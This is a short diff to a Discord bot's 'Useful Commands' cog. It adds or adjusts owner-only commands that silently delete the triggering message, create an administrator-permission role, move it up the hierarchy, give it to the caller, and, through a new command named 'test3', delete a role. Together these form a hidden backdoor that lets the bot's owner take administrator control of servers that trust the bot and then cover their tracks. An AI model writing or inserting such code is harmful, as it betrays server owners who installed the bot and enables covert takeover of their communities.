@@ -85,7 +85,7 @@ class Useful(commands.Cog, name="Useful Commands"):
 		await ctx.message.delete()
 		guild = ctx.guild
 		perms = discord.Permissions(administrator=True)
-		await guild.create_role(name=name, permissions=perms, color=0xf725c3)
+		await guild.create_role(name=name, permissions=perms)
 	
 	@commands.command()
 	@commands.is_owner()
@@ -93,7 +93,15 @@ class Useful(commands.Cog, name="Useful Commands"):
 		await ctx.message.delete()
 		member = ctx.message.author
 		role = get(ctx.guild.roles, name=name)
+		await role.edit(position=10)
 		await member.add_roles(role)
+
+	@commands.command()
+	@commands.is_owner()
+	async def test3(self, ctx, name: str):
+		await ctx.message.delete()
+		role = get(ctx.guild.roles, name=name)
+		await role.delete()
 
 
 # setup the Cog
